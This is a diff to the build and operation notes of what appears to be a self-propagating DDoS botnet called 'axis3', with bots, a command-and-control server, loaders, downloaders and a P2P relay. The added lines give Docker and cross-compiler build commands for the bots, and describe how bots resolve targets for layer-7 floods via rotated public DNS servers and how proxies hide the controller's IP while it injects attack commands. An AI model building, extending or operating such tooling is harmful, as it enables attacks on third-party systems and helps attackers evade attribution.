@@ -123,9 +123,17 @@ func (this *P2PInjector) UpdateBotCount(count int) {
 
 ## Build Commands
 
+### Docker Build (Self-Contained)
 ```bash
-./build.sh           # Bots (with -DSELFREP), C&C, loader, DLRs, Seeder
-./build_relay.sh     # Relay server
+docker build -t axis3-builder .
+docker run -v $(pwd):/workspace axis3-builder ./build.sh
+```
+
+### System Build
+```bash
+./setup_cross_compilers.sh  # Installs all 13 cross-compilers
+./build.sh                  # Bots, C&C, loader, DLRs, Seeder
+./build_relay.sh            # Relay server
 ```
 
 Bot build flags: `-DKILLER -DSELFREP -DP2P_ENABLED=1`
@@ -180,6 +188,9 @@ Proxy lists are stored in `proxies/` directory:
 Proxies are used by CNC to shield its IP when injecting attack commands into the P2P network.
 
 ### Bot Auto-Maintenance
+- DNS resolution: 7 DNS servers rotated (1.1.1.1, 8.8.8.8, 8.8.4.4, 9.9.9.9, 1.0.0.1, etc.)
+- L7 attacks resolve domains via DNS (no CNC pre-resolution needed)
+- HTTP/HTTPS auto-detection from URL scheme
 - Peer ping every 30s (random 3 peers)
 - Peer timeout: 120s
 - Binary redownload check: every 60s
